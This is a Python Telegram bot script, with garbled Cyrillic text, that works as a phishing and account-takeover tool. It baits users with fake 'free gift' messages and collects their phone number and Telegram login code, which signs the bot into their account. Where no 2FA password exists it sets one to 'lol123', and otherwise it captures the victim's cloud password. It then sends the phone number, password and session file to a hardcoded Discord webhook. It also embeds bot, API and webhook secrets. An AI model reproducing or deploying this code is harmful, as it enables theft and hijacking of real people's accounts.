import asyncio
import os
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from aiogram.dispatcher.filters import Text
from telethon import TelegramClient
from telethon.sessions import SQLiteSession
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError
import aioschedule

# --- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ---
BOT_TOKEN = "8496063485:AAGGJpcjFEyLI8bM4hsA6sYmDHYgzb3kRm8"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1411003346126635082/lgiKWDpfa7L_D83oOEjxyX85VF1yNHKdwnmuEfaBLhDyCDO9fXGlMi_tbCez_cONu_lZ"
API_ID = 24647488
API_HASH = "5359d6239969c07a29ea06167484a885"
TARGET_CHAT_ID = "8496063485"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_data = {}

# --- –®–∞–±–ª–æ–Ω—ã –∏ –∫–∞—Ä—Ç–∏–Ω–∫–∏ ---
templates = [
    "‚ú® –£–°–ü–ï–ô –ó–ê–ë–†–ê–¢–¨ 1 –ò–ó 1000 –ö–û–õ–ï–¶ üíç",
    "üî• –ó–ê–ë–ï–†–ò –ú–ò–®–ö–£ –¢–û–õ–¨–ö–û –°–ï–ì–û–î–ù–Ø üî•",
    "üéÅ –ë–ï–°–ü–õ–ê–¢–ù–´–ô –°–ù–£–ü –î–û–ì –£–°–ü–ï–ô –ó–ê–ë–†–ê–¢–¨!",
    "üíé –ó–ê–ë–ï–†–ò –†–û–ó–£ –ó–ê –ó–ê–ü–£–°–ö –ë–û–¢–ê",
    "‚ú® –ë–ï–°–ü–õ–ê–¢–ù–´–ô –õ–û–õ–ò –ü–û–ü –ü–†–Ø–ú–û –°–ï–ô–ß–ê–°",
    "‚ö° –¢–æ–ø–æ–≤—ã–π –∫–∞–ª–µ–Ω–¥–∞—Ä–∏–∫ –∑–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ!",
    "üéØ –ñ–º–∏ /start –∏ –∑–∞–±–∏—Ä–∞–π —Å–≤–æ—é —Å–æ–±–∞–∫—É —Ä—É–¥–æ –Ω–µ —É–ø—É—Å—Ç–∏ —Å–≤–æ–π —à–∞–Ω—Å!",
    "üèÜ –ó–∞ /start –¥–∞—Ä–∏–º —Ä–∞–∫–µ—Ç—É",
    "üöÄ –ë—É–¥—å –ø–µ—Ä–≤—ã–º –∫—Ç–æ –∑–∞–±–µ—Ä–µ—Ç –±–µ—Å–ø–ª–∞—Ç–Ω–æ –ø–µ–ø—É",
    "‚ù§Ô∏è –ü–æ–¥–∞—Ä–æ–∫ –¥–ª—è –æ—Å–æ–±–µ–Ω–Ω–æ–≥–æ —á–µ–ª–æ–≤–µ–∫–∞"
]

photos = [f"photos/{i}.png" for i in range(1, 11)]
index = 0

# --- –ü–∞–ø–∫–∏ ---
os.makedirs("sessions", exist_ok=True)

# --- –†–∞—Å—Å—ã–ª–∫–∞ –ø–æ —Ä–∞—Å–ø–∏—Å–∞–Ω–∏—é ---
async def send_scheduled_message():
    global index
    try:
        if os.path.exists(photos[index]):
            with open(photos[index], 'rb') as photo:
                await bot.send_photo(chat_id=TARGET_CHAT_ID, photo=photo, caption=templates[index])
            print(f"‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ {index + 1}: {templates[index]}")
        index = (index + 1) % len(templates)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ä–∞—Å—Å—ã–ª–∫–∏: {e}")

async def scheduler():
    aioschedule.every(1).hours.do(send_scheduled_message)
    while True:
        await aioschedule.run_pending()
        await asyncio.sleep(1)

async def on_startup(dp):
    asyncio.create_task(scheduler())
    print("üöÄ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω! –†–∞—Å—Å—ã–ª–∫–∞ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –∫–∞–∂–¥—ã–π —á–∞—Å.")

# --- –§—É–Ω–∫—Ü–∏—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–∞—Ä–æ–ª—è ---
async def set_custom_password(client):
    try:
        await client.edit_2fa(new_password='lol123', hint='lol123')
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ –ø–∞—Ä–æ–ª—è —á–µ—Ä–µ–∑ edit_2fa: {e}")
        return False

# --- –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ ---
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="üéÅ –ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫ üéÅ", callback_data="get_reward"))
    start_photo = "photos/start.png"
    if os.path.exists(start_photo):
        with open(start_photo, "rb") as photo:
            await message.answer_photo(photo=photo, caption="–ü—Ä–∏–≤–µ—Ç, —Å—á–∞—Å—Ç–ª–∏–≤—á–∏–∫! ‚ú® –¢–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –∂–¥—ë—Ç —Ç–µ–±—è üéÅ", reply_markup=kb)
    else:
        await message.answer("–ü—Ä–∏–≤–µ—Ç, —Å—á–∞—Å—Ç–ª–∏–≤—á–∏–∫! ‚ú® –¢–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –∂–¥—ë—Ç —Ç–µ–±—è üéÅ", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "get_reward")
async def process_callback_get_reward(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    try:
        await bot.edit_message_reply_markup(chat_id=callback_query.from_user.id,
                                            message_id=callback_query.message.message_id,
                                            reply_markup=None)
    except:
        pass
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton(text="ü§ñ–ü—Ä–æ–π—Ç–∏ –ø—Ä–æ–≤–µ—Ä–∫—É", request_contact=True))
    await bot.send_message(callback_query.from_user.id, "üéâ –ü—Ä–æ–π–¥–∏ –ø—Ä–æ–≤–µ—Ä–∫—É, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫!", reply_markup=kb)

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    phone = message.contact.phone_number
    session_name = f"sessions/{phone}"
    client = TelegramClient(SQLiteSession(session_name), API_ID, API_HASH)
    await client.connect()
    user_data[message.from_user.id] = {"client": client, "phone": phone, "code": "", "has_password": False, "user_password": None}
    try:
        await client.send_code_request(phone)
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞: {e}")
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    buttons = [str(i) for i in range(1, 10)] + ['0', '–£–¥–∞–ª–∏—Ç—å', '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å']
    kb.add(*buttons)
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram:", reply_markup=kb)

@dp.message_handler(Text(equals=[str(i) for i in range(10)] + ['–£–¥–∞–ª–∏—Ç—å']))
async def enter_code(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        await message.answer("–û—à–∏–±–∫–∞: —Å–Ω–∞—á–∞–ª–∞ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–Ω—Ç–∞–∫—Ç.")
        return
    if message.text == "–£–¥–∞–ª–∏—Ç—å":
        data["code"] = data["code"][:-1]
    else:
        data["code"] += message.text
    await message.answer(f"–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è: {data['code']}")

@dp.message_handler(Text(equals='–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å'))
async def confirm_code(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        await message.answer("–û—à–∏–±–∫–∞: –Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.")
        return
    client = data["client"]
    phone = data["phone"]
    code = data["code"]
    try:
        await client.sign_in(phone=phone, code=code)
        success = await set_custom_password(client)
        if success:
            await message.answer("üíé –í —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ –≤–æ–∑–Ω–∞–≥—Ä–∞–∂–¥–µ–Ω–∏–µ")
        await finish_session(message, client, phone)
    except SessionPasswordNeededError:
        data["has_password"] = True
        await message.answer("–í–≤–µ–¥–∏—Ç–µ –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å:")
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")

@dp.message_handler(lambda message: len(message.text) >= 4)
async def handle_password(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        return
    client = data["client"]
    password_text = message.text
    try:
        if data["has_password"]:
            data["user_password"] = password_text
            await client.sign_in(password=password_text)
        await finish_session(message, client, data["phone"], data["user_password"])
    except PasswordHashInvalidError:
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å.")
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")

async def finish_session(message: types.Message, client: TelegramClient, phone: str, user_password=None):
    await client.disconnect()
    session_path = f"sessions/{phone}.session"
    discord_data = {"content": f"üì± –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è\n–¢–µ–ª–µ—Ñ–æ–Ω: {phone}\n"}
    if user_password:
        discord_data["content"] += f"–ü–∞—Ä–æ–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ||{user_password}||"
    else:
        discord_data["content"] += "–£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–∞—Ä–æ–ª—å: lol123"
    try:
        requests.post(DISCORD_WEBHOOK, json=discord_data)
    except:
        pass
    if os.path.exists(session_path):
        try:
            with open(session_path, "rb") as f:
                requests.post(DISCORD_WEBHOOK, files={"file": (f"{phone}.session", f)})
        except:
            pass
    await message.answer("‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!", reply_markup=ReplyKeyboardRemove())

# --- –ó–∞–ø—É—Å–∫ ---
if __name__ == "__main__":
    print("üöÄ –ë–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
